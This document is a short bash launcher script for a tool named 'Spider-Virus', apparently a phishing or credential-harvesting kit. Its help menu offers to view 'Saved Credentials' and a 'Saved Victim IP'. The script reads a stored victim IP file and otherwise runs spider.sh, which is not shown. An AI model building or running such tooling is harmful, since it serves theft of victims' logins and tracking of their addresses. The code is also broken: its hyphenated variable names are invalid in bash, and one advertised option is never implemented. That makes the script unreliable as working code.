

if [[ $(uname -o) == *'Android'* ]];then
	Spider-Virus_ROOT="/data/data/com.termux/files/usr/opt/Spider-Virus"
else
	export Spider-Virus_ROOT="/opt/Spider-Virus"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Spider-Virus type \`Spider-Virus\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo

elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $Spider-Virus_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $Spider-Virus_ROOT
	bash ./spider.sh
fi
